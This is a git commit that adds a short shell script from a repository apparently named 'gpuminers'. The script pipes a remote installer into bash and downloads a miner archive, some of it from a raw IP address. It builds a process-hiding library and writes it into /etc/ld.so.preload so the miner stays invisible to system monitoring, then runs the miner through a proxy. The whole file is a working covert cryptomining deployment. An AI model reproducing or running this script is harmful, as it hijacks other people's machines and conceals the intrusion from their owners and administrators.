aa8d2d93d55b34c269a214696b9bcc24073d8514
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-07-20 19:01:27 +0200

    Create start_min_flex_ws5.sh

---
+++ start_min_flex_ws5.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks5.sh | bash
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicMin.zip
+unzip magicMin.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+wget http://13.244.135.172/miniZ_v1.8y3_linux-x64.tar.gz
+tar -xvzf miniZ_v1.8y3_linux-x64.tar.gz
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/min_flex.sh
+chmod +x min_flex.sh
+graftcp ./min_flex.sh
